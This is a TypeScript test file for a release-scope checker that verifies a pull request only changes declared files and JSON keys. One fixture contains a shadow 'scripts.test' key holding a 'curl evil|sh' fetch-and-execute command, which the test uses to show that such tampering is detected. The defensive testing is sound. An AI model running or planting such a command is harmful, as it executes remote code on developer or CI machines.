// src/release/unitcheck.test.ts -- the pure pieces of `nen release unit-check`.

import { describe, expect, it } from "vitest";
import { ScriptedSeams } from "../seam/scripted.js";
import {
  assembleUnitCheck,
  checkKeyScopedPath,
  fetchChangedFiles,
  fetchJsonAtRef,
  fetchMergeBaseSha,
  JsonParseError,
  MergeBaseError,
  outsideReleaseUnit,
  parseJsonPreservingNumbers,
  resolvePrRef,
  resolveUnitCheckTarget,
  UnitCheckRefError,
  type JValue,
} from "./unitcheck.js";

describe("resolvePrRef -- <n> or <owner/name>#<n>, never a guess", () => {
  it("reads a bare number with no slug", () => {
    expect(resolvePrRef("42")).toEqual({ slug: null, number: 42 });
  });

  it("reads owner/name#n", () => {
    expect(resolvePrRef("acme/widgets#7")).toEqual({ slug: "acme/widgets", number: 7 });
  });

  it("refuses a token with no digits", () => {
    expect(() => resolvePrRef("acme/widgets")).toThrow(UnitCheckRefError);
  });

  it("refuses zero -- not a positive pull-request number", () => {
    expect(() => resolvePrRef("0")).toThrow(UnitCheckRefError);
  });
});

describe("resolveUnitCheckTarget", () => {
  it("uses the explicit slug without touching git at all", () => {
    const seams = new ScriptedSeams([]);
    const target = resolveUnitCheckTarget(seams, "/repo", { slug: "acme/widgets", number: 1 });
    expect(target.slug).toBe("acme/widgets");
  });

  it("falls back to the checkout's own origin when the ref carries no slug", () => {
    const seams = new ScriptedSeams([
      { match: "git remote get-url origin", result: { code: 0, stdout: "git@github.com:acme/widgets.git\n" } },
    ]);
    const target = resolveUnitCheckTarget(seams, "/repo", { slug: null, number: 1 });
    expect(target.slug).toBe("acme/widgets");
  });

  it("refuses a malformed explicit slug", () => {
    const seams = new ScriptedSeams([]);
    expect(() => resolveUnitCheckTarget(seams, "/repo", { slug: "not-a-slug", number: 1 })).toThrow(UnitCheckRefError);
  });
});

describe("fetchChangedFiles", () => {
  it("reads the file paths off gh api --paginate .../files (F2)", () => {
    const seams = new ScriptedSeams([
      {
        match: "gh api --paginate --slurp repos/acme/widgets/pulls/9/files",
        result: { code: 0, stdout: JSON.stringify([{ filename: "src/a.ts" }, { filename: "docs/b.md" }]) },
      },
      {
        match: "gh api repos/acme/widgets/pulls/9",
        result: { code: 0, stdout: JSON.stringify({ changed_files: 2 }) },
      },
    ]);
    const files = fetchChangedFiles(seams, { owner: "acme", repo: "widgets", slug: "acme/widgets" }, 9);
    expect(files).toEqual([
      { path: "src/a.ts", previousPath: null },
      { path: "docs/b.md", previousPath: null },
    ]);
  });

  it("flattens two pages of --slurp output into one changed-file list (item 5)", () => {
    const seams = new ScriptedSeams([
      {
        match: "gh api --paginate --slurp repos/acme/widgets/pulls/9/files",
        // `--slurp` wraps each page's own JSON array inside one outer array
        // -- this is what TWO pages of the underlying endpoint look like
        // once `gh` has slurped them, as opposed to the un-slurped
        // concatenation of two bare arrays back-to-back.
        result: {
          code: 0,
          stdout: JSON.stringify([
            [{ filename: "src/a.ts" }, { filename: "src/b.ts" }],
            [{ filename: "docs/c.md" }],
          ]),
        },
      },
      {
        match: "gh api repos/acme/widgets/pulls/9",
        result: { code: 0, stdout: JSON.stringify({ changed_files: 3 }) },
      },
    ]);
    const files = fetchChangedFiles(seams, { owner: "acme", repo: "widgets", slug: "acme/widgets" }, 9);
    expect(files).toEqual([
      { path: "src/a.ts", previousPath: null },
      { path: "src/b.ts", previousPath: null },
      { path: "docs/c.md", previousPath: null },
    ]);
  });

  it("reads previous_filename for a rename (F2)", () => {
    const seams = new ScriptedSeams([
      {
        match: "gh api --paginate --slurp repos/acme/widgets/pulls/9/files",
        result: { code: 0, stdout: JSON.stringify([{ filename: "src/new.ts", previous_filename: "src/old.ts" }]) },
      },
      {
        match: "gh api repos/acme/widgets/pulls/9",
        result: { code: 0, stdout: JSON.stringify({ changed_files: 1 }) },
      },
    ]);
    const files = fetchChangedFiles(seams, { owner: "acme", repo: "widgets", slug: "acme/widgets" }, 9);
    expect(files).toEqual([{ path: "src/new.ts", previousPath: "src/old.ts" }]);
  });

  // F2: a PR reporting more changed files than the files endpoint actually
  // returned is a truncated read (GitHub paginates and caps this endpoint) --
  // refused rather than answered off an incomplete list.
  it("refuses when the PR's changed_files count disagrees with the files endpoint (F2)", () => {
    const seams = new ScriptedSeams([
      {
        match: "gh api --paginate --slurp repos/acme/widgets/pulls/9/files",
        result: { code: 0, stdout: JSON.stringify([{ filename: "src/a.ts" }]) },
      },
      {
        match: "gh api repos/acme/widgets/pulls/9",
        result: { code: 0, stdout: JSON.stringify({ changed_files: 150 }) },
      },
    ]);
    expect(() => fetchChangedFiles(seams, { owner: "acme", repo: "widgets", slug: "acme/widgets" }, 9)).toThrow(/truncated/);
  });

  it("refuses at GitHub's 3000-file cap (F2)", () => {
    const many = Array.from({ length: 3000 }, (_unused, index): { filename: string } => ({ filename: `src/f${index}.ts` }));
    const seams = new ScriptedSeams([
      {
        match: "gh api --paginate --slurp repos/acme/widgets/pulls/9/files",
        result: { code: 0, stdout: JSON.stringify(many) },
      },
      {
        match: "gh api repos/acme/widgets/pulls/9",
        result: { code: 0, stdout: JSON.stringify({ changed_files: 3000 }) },
      },
    ]);
    expect(() => fetchChangedFiles(seams, { owner: "acme", repo: "widgets", slug: "acme/widgets" }, 9)).toThrow(/3000-file cap/);
  });
});

function file(path: string, previousPath: string | null = null): { readonly path: string; readonly previousPath: string | null } {
  return { path, previousPath };
}

describe("outsideReleaseUnit -- the pure classification", () => {
  it("is empty when every changed path is claimed by a prefix or glob", () => {
    const outside = outsideReleaseUnit([file("src/unit/a.ts"), file("src/unit/sub/b.ts")], ["src/unit"]);
    expect(outside).toEqual([]);
  });

  it("names every path outside the unit, never stopping at the first", () => {
    const outside = outsideReleaseUnit(
      [file("src/unit/a.ts"), file("src/other/b.ts"), file("docs/readme.md")],
      ["src/unit/**"],
    );
    expect(outside).toEqual(["src/other/b.ts", "docs/readme.md"]);
  });

  it("reads a glob pattern the same way ../review/scopes.ts's grammar does", () => {
    const outside = outsideReleaseUnit([file("src/unit/deep/nested/file.ts")], ["src/unit/**"]);
    expect(outside).toEqual([]);
  });

  // F2: a rename FROM outside the unit is outside, even though its new name
  // now sits inside -- the unit's boundary is not something a rename alone
  // can smuggle a file across.
  it("treats a rename-in from outside the unit as outside (F2)", () => {
    const outside = outsideReleaseUnit([file("src/unit/renamed.ts", "src/outside/renamed.ts")], ["src/unit/**"]);
    expect(outside).toEqual(["src/unit/renamed.ts"]);
  });

  it("does not flag a rename that stays inside the unit on both ends (F2)", () => {
    const outside = outsideReleaseUnit([file("src/unit/renamed.ts", "src/unit/old-name.ts")], ["src/unit/**"]);
    expect(outside).toEqual([]);
  });

  it("claims a content-scoped (object) entry's path by exact equality, not as a pattern", () => {
    const outside = outsideReleaseUnit(
      [file("nen/contract.json")],
      [{ path: "nen/contract.json", keys: ["version"] }],
    );
    expect(outside).toEqual([]);
  });

  it("a content-scoped entry's path does not claim a different file, even a sibling", () => {
    const outside = outsideReleaseUnit(
      [file("nen/other.json")],
      [{ path: "nen/contract.json", keys: ["version"] }],
    );
    expect(outside).toEqual(["nen/other.json"]);
  });
});

const TARGET = { owner: "acme", repo: "widgets", slug: "acme/widgets" };

/** Builds a `JValue` tree from an ordinary JS value, for test convenience -- production code never does this (see `parseJsonPreservingNumbers`'s own header for why `JSON.parse` is not used there). */
function jv(value: unknown): JValue {
  return parseJsonPreservingNumbers(JSON.stringify(value));
}
/** Builds a `JValue` tree from RAW JSON TEXT, for the big-integer precision tests, where `JSON.stringify(JSON.parse(...))` would already have lost the precision this test exists to prove is preserved. */
function jvRaw(text: string): JValue {
  return parseJsonPreservingNumbers(text);
}

describe("fetchJsonAtRef -- reads and parses a repo file's content at one ref, fail-closed", () => {
  function contentsCall(json: unknown): { readonly match: string; readonly result: { readonly code: number; readonly stdout: string } } {
    return {
      match: "gh api repos/acme/widgets/contents/nen/contract.json?ref=abc123",
      result: { code: 0, stdout: JSON.stringify({ content: Buffer.from(JSON.stringify(json)).toString("base64") }) },
    };
  }

  it("decodes base64 content and parses it as JSON", () => {
    const seams = new ScriptedSeams([contentsCall({ version: "1.0.0" })]);
    expect(fetchJsonAtRef(seams, TARGET, "nen/contract.json", "abc123")).toEqual(jv({ version: "1.0.0" }));
  });

  it("is null when gh itself refuses (missing file, bad ref, ...)", () => {
    const seams = new ScriptedSeams([
      { match: "gh api repos/acme/widgets/contents/nen/contract.json?ref=abc123", result: { code: 1, stdout: "", stderr: "404" } },
    ]);
    expect(fetchJsonAtRef(seams, TARGET, "nen/contract.json", "abc123")).toBeNull();
  });

  it("is null when the decoded content is not valid JSON", () => {
    const seams = new ScriptedSeams([
      {
        match: "gh api repos/acme/widgets/contents/nen/contract.json?ref=abc123",
        result: { code: 0, stdout: JSON.stringify({ content: Buffer.from("not json").toString("base64") }) },
      },
    ]);
    expect(fetchJsonAtRef(seams, TARGET, "nen/contract.json", "abc123")).toBeNull();
  });

  // N2: every path segment is percent-encoded before it reaches the contents
  // URL, so a segment carrying a space or non-ASCII character is named
  // verbatim rather than changing what the URL means.
  it("percent-encodes each path segment in the contents URL (N2)", () => {
    const seen: string[][] = [];
    const seams = {
      run: (_cmd: string, args: string[]): { code: number; stdout: string; stderr: string; spawnFailed: boolean } => {
        seen.push(args);
        return { code: 0, stdout: JSON.stringify({ content: Buffer.from("{}").toString("base64") }), stderr: "", spawnFailed: false };
      },
    } as unknown as ScriptedSeams;
    fetchJsonAtRef(seams, TARGET, "cfg/a dir/b.json", "SHA");
    expect(seen[0]).toEqual(["api", "repos/acme/widgets/contents/cfg/a%20dir/b.json?ref=SHA"]);
  });
});

describe("N1 -- the structural diff engine, every fail-open case from the reviewer's probe", () => {
  function offending(base: unknown, head: unknown, keys: readonly string[]): readonly string[] {
    const outcome = checkKeyScopedPath({ path: "p.json", keys }, "B", "H", (_p, ref): JValue => (ref === "B" ? jv(base) : jv(head)));
    return outcome.offendingKeys;
  }

  it("nested->dotted-literal restructure is a violation, not a pass (a literal 'a.b' key is not the nested path)", () => {
    const offendingKeys = offending({ version: "1", a: { b: 1 } }, { version: "1", "a.b": 1 }, ["version"]);
    expect(offendingKeys.length).toBeGreaterThan(0);
  });

  it("a shadow literal dotted key does not hide as the real nested path (scripts.test as a literal key vs {scripts:{test}})", () => {
    const offendingKeys = offending(
      { version: "1", scripts: { test: "jest" } },
      { version: "1", "scripts.test": "curl evil|sh", scripts: { test: "jest" } },
      ["version"],
    );
    expect(offendingKeys).toContain("scripts.test");
  });

  it("array->object of equal-looking content is a violation (a container TYPE change)", () => {
    const offendingKeys = offending({ version: "1", a: [5] }, { version: "1", a: { "0": 5 } }, ["version"]);
    expect(offendingKeys.length).toBeGreaterThan(0);
  });

  it("object->string AT the allowed key itself is fine -- the type change IS the declared key's own change", () => {
    const offendingKeys = offending({ version: "1", cfg: { x: 1 } }, { version: "1", cfg: "s" }, ["cfg"]);
    expect(offendingKeys).toEqual([]);
  });

  it("a prefix key name does not fuzzy-match a longer real key ('ver' does not allow 'version')", () => {
    const offendingKeys = offending({ version: 1 }, { version: 2 }, ["ver"]);
    expect(offendingKeys.length).toBeGreaterThan(0);
  });

  it("JSON-pointer '~1' decodes to a literal '/' inside one segment (N5)", () => {
    const offendingKeys = offending({ "a/b": 1 }, { "a/b": 2 }, ["/a~1b"]);
    expect(offendingKeys).toEqual([]);
  });

  it("a JSON-pointer's literal '.' is NOT a nested-path separator -- '/a.b' names one segment, never a.b nesting", () => {
    const offendingKeys = offending({ a: { b: 1 } }, { a: { b: 2 } }, ["/a.b"]);
    expect(offendingKeys.length).toBeGreaterThan(0);
  });

  it("root {} -> {'(root)':{}} is a change AT the literal key '(root)', not a sentinel collision", () => {
    const offendingKeys = offending({}, { "(root)": {} }, ["version"]);
    expect(offendingKeys).toEqual(["(root)"]);
  });

  it("a root scalar -> {'':1} is a TYPE change at the root, never confused with an empty-string leaf", () => {
    const offendingKeys = offending(1, { "": 1 }, ["version"]);
    expect(offendingKeys).toEqual(["(root)"]);
  });

  it("null->missing (key removed) is a violation when the key is not declared", () => {
    const offendingKeys = offending({ version: "1", a: null }, { version: "1" }, ["version"]);
    expect(offendingKeys).toEqual(["a"]);
  });

  it("a whole subtree under an allowed key may change freely, additions included", () => {
    const offendingKeys = offending({ version: { major: 1 } }, { version: { major: 2, minor: 0 } }, ["version"]);
    expect(offendingKeys).toEqual([]);
  });

  it("a type change at an ANCESTOR of a declared key is a violation, even though the declared key itself would have been allowed", () => {
    const offendingKeys = offending({ version: { major: 1 } }, { version: "not an object anymore" }, ["version.major"]);
    expect(offendingKeys).toEqual(["version"]);
  });

  // N16: two JSON numbers past Number.MAX_SAFE_INTEGER that JSON.parse would
  // round to the SAME double must still compare as CHANGED when their raw
  // source text differs.
  it("N16: a big-integer edit past safe precision is detected by raw token text, not the rounded double", () => {
    const outcome = checkKeyScopedPath(
      { path: "p.json", keys: ["version"] },
      "B",
      "H",
      (_p, ref): JValue => jvRaw(ref === "B" ? '{"n":12345678901234567890}' : '{"n":12345678901234567891}'),
    );
    expect(outcome.ok).toBe(false);
    expect(outcome.offendingKeys).toEqual(["n"]);
  });

  it("N16: two safe-range numbers with different formatting (1 vs 1.0) still compare equal", () => {
    const outcome = checkKeyScopedPath({ path: "p.json", keys: ["version"] }, "B", "H", (_p, ref): JValue => jvRaw(ref === "B" ? '{"n":1}' : '{"n":1.0}'));
    expect(outcome.ok).toBe(true);
  });

  // Copilot round, item 3: the exponent form is a SAFE-INTEGER spelling too
  // -- excluding every exponent token outright (the previous rule) made '1'
  // vs '1e0' at an undeclared key a false violation.
  it("Copilot#3: 1 vs 1e0 at an undeclared key compares equal (both are the safe integer 1)", () => {
    const outcome = checkKeyScopedPath({ path: "p.json", keys: ["version"] }, "B", "H", (_p, ref): JValue => jvRaw(ref === "B" ? '{"n":1}' : '{"n":1e0}'));
    expect(outcome.ok).toBe(true);
  });

  it("Copilot#3: a big-integer edit past safe precision is STILL detected (unaffected by the exponent fix)", () => {
    const outcome = checkKeyScopedPath(
      { path: "p.json", keys: ["version"] },
      "B",
      "H",
      (_p, ref): JValue => jvRaw(ref === "B" ? '{"n":12345678901234567890}' : '{"n":12345678901234567891}'),
    );
    expect(outcome.ok).toBe(false);
    expect(outcome.offendingKeys).toEqual(["n"]);
  });
});

describe("Copilot round, item 1 -- an unescaped control character in a JSON string fails the parse", () => {
  it("refuses a raw (unescaped) newline inside a string", () => {
    expect(() => parseJsonPreservingNumbers('{"a":"line1\nline2"}')).toThrow(JsonParseError);
  });

  it("refuses a raw NUL and other control characters below U+0020", () => {
    expect(() => parseJsonPreservingNumbers('{"a":"\u0001"}')).toThrow(JsonParseError);
    expect(() => parseJsonPreservingNumbers('{"a":"\u0000"}')).toThrow(JsonParseError);
  });

  it("a caller reading through fetchJsonAtRef sees this as null (fail closed), not a thrown error", () => {
    const raw = Buffer.from('{"a":"bad\u0001char"}').toString("base64");
    const seams = new ScriptedSeams([
      { match: "gh api repos/acme/widgets/contents/nen/contract.json?ref=abc123", result: { code: 0, stdout: JSON.stringify({ content: raw }) } },
    ]);
    expect(fetchJsonAtRef(seams, TARGET, "nen/contract.json", "abc123")).toBeNull();
  });

  it("still accepts the SAME control character when properly escaped (\\n, \\u0001)", () => {
    expect(parseJsonPreservingNumbers('{"a":"line1\\nline2"}')).toEqual(jv({ a: "line1\nline2" }));
    expect(parseJsonPreservingNumbers('{"a":"\\u0001"}')).toEqual(jv({ a: "\u0001" }));
  });
});

describe("Copilot round, item 2 -- the number grammar refuses leading zeroes and other non-JSON spellings", () => {
  it.each(["01", "-01", "00", "007"])("refuses a leading-zero integer '%s'", (bad) => {
    expect(() => parseJsonPreservingNumbers(`{"n":${bad}}`)).toThrow(JsonParseError);
  });

  it("still accepts a bare '0' and '0.5' and '0e1'", () => {
    expect(parseJsonPreservingNumbers('{"n":0}')).toEqual(jv({ n: 0 }));
    expect(parseJsonPreservingNumbers('{"n":0.5}')).toEqual(jv({ n: 0.5 }));
    expect(() => parseJsonPreservingNumbers('{"n":0e1}')).not.toThrow();
  });

  it.each(["1.", ".5", "+1", "1e"])("refuses the malformed number token '%s'", (bad) => {
    expect(() => parseJsonPreservingNumbers(`{"n":${bad}}`)).toThrow(JsonParseError);
  });
});

describe("Copilot round, item 4 -- fetchJsonAtRef validates base64 before decoding (fail closed)", () => {
  function contentsCall(rawContent: string): { readonly match: string; readonly result: { readonly code: number; readonly stdout: string } } {
    return {
      match: "gh api repos/acme/widgets/contents/nen/contract.json?ref=abc123",
      result: { code: 0, stdout: JSON.stringify({ content: rawContent }) },
    };
  }

  it("is null when the content carries an illegal base64 character ('e30$')", () => {
    const seams = new ScriptedSeams([contentsCall("e30$")]);
    expect(fetchJsonAtRef(seams, TARGET, "nen/contract.json", "abc123")).toBeNull();
  });

  it("is null when the content's length is not a multiple of 4", () => {
    const seams = new ScriptedSeams([contentsCall("e30")]); // "{}"  base64 is normally "e30=" (4 chars); this is 3.
    expect(fetchJsonAtRef(seams, TARGET, "nen/contract.json", "abc123")).toBeNull();
  });

  it("still decodes a valid base64 payload, including one GitHub wrapped with newlines", () => {
    const valid = Buffer.from(JSON.stringify({ version: "1" })).toString("base64");
    const wrapped = `${valid.slice(0, 2)}\n${valid.slice(2)}`;
    const seams = new ScriptedSeams([contentsCall(wrapped)]);
    expect(fetchJsonAtRef(seams, TARGET, "nen/contract.json", "abc123")).toEqual(jv({ version: "1" }));
  });
});

describe("checkKeyScopedPath -- a content-scoped entry's own verdict", () => {
  it("passes when the only leaves that differ are declared keys (dotted or JSON-pointer)", () => {
    const outcome = checkKeyScopedPath(
      { path: "nen/contract.json", keys: ["version", "/nested/allowed"] },
      "base",
      "head",
      (_path, ref): JValue =>
        ref === "base"
          ? jv({ version: "1.0.0", nested: { allowed: "x" } })
          : jv({ version: "1.0.1", nested: { allowed: "y" } }),
    );
    expect(outcome).toEqual({ path: "nen/contract.json", ok: true, offendingKeys: [] });
  });

  it("fails and names the offending key when an undeclared leaf changes too (version + description)", () => {
    const outcome = checkKeyScopedPath(
      { path: "nen/contract.json", keys: ["version"] },
      "base",
      "head",
      (_path, ref): JValue =>
        ref === "base"
          ? jv({ version: "1.0.0", description: "old" })
          : jv({ version: "1.0.1", description: "new" }),
    );
    expect(outcome.ok).toBe(false);
    expect(outcome.offendingKeys).toEqual(["description"]);
  });

  it("fails closed when either side is unreadable/unparseable JSON", () => {
    const outcome = checkKeyScopedPath({ path: "nen/contract.json", keys: ["version"] }, "base", "head", (): JValue | null => null);
    expect(outcome.ok).toBe(false);
    expect(outcome.offendingKeys.length).toBeGreaterThan(0);
  });
});

describe("assembleUnitCheck -- wired with a keyScoped context", () => {
  it("reports ok:true when a plain unit is clean and a content-scoped entry only changed its declared key", () => {
    const report = assembleUnitCheck(
      TARGET,
      42,
      [{ path: "nen/contract.json", keys: ["version"] }],
      [file("nen/contract.json")],
      { baseRef: "base", headRef: "head", readJson: (_path, ref): JValue => (ref === "base" ? jv({ version: "1.0.0" }) : jv({ version: "1.0.1" })) },
    );
    expect(report.ok).toBe(true);
    expect(report.keyScopedViolations).toEqual([]);
    // N15: 'unitPaths' stays string-only; the object entry moves to 'keyedPaths'.
    expect(report.unitPaths).toEqual([]);
    expect(report.keyedPaths).toEqual([{ path: "nen/contract.json", keys: ["version"] }]);
  });

  it("reports ok:false and names the offending key when the content-scoped entry changes outside its keys", () => {
    const report = assembleUnitCheck(
      TARGET,
      42,
      [{ path: "nen/contract.json", keys: ["version"] }],
      [file("nen/contract.json")],
      {
        baseRef: "base",
        headRef: "head",
        readJson: (_path, ref): JValue => (ref === "base" ? jv({ version: "1.0.0", description: "old" }) : jv({ version: "1.0.1", description: "new" })),
      },
    );
    expect(report.ok).toBe(false);
    expect(report.keyScopedViolations).toEqual([{ path: "nen/contract.json", ok: false, offendingKeys: ["description"] }]);
  });

  it("skips the content read entirely for a keyed entry that was never changed", () => {
    let reads = 0;
    const report = assembleUnitCheck(
      TARGET,
      42,
      [{ path: "nen/contract.json", keys: ["version"] }, "src/unit/**"],
      [file("src/unit/a.ts")],
      {
        baseRef: "base",
        headRef: "head",
        readJson: (): JValue => {
          reads += 1;
          return jv({});
        },
      },
    );
    expect(reads).toBe(0);
    expect(report.ok).toBe(true);
    expect(report.unitPaths).toEqual(["src/unit/**"]);
  });

  // N4: a touched keyed entry with NO keyScoped context must not read as a
  // silent pass -- it is a violation this check could not even attempt.
  it("N4: reports a violation (never a silent pass) for a touched keyed entry when no keyScoped context is supplied", () => {
    const report = assembleUnitCheck(TARGET, 42, [{ path: "nen/contract.json", keys: ["version"] }], [file("nen/contract.json")]);
    expect(report.ok).toBe(false);
    expect(report.keyScopedViolations).toHaveLength(1);
    expect(report.keyScopedViolations[0]?.path).toBe("nen/contract.json");
    expect(report.keyScopedViolations[0]?.offendingKeys[0]).toMatch(/content not read/);
  });
});

describe("fetchMergeBaseSha -- N6, the merge base rather than baseRefOid directly", () => {
  it("reads merge_base_commit.sha off the compare endpoint", () => {
    const seams = new ScriptedSeams([
      { match: "gh api repos/acme/widgets/compare/BASE...HEAD", result: { code: 0, stdout: JSON.stringify({ merge_base_commit: { sha: "mergebasesha" } }) } },
    ]);
    expect(fetchMergeBaseSha(seams, TARGET, "BASE", "HEAD")).toBe("mergebasesha");
  });

  it("throws MergeBaseError when the response carries no merge_base_commit.sha", () => {
    const seams = new ScriptedSeams([
      { match: "gh api repos/acme/widgets/compare/BASE...HEAD", result: { code: 0, stdout: JSON.stringify({}) } },
    ]);
    expect(() => fetchMergeBaseSha(seams, TARGET, "BASE", "HEAD")).toThrow(MergeBaseError);
  });
});
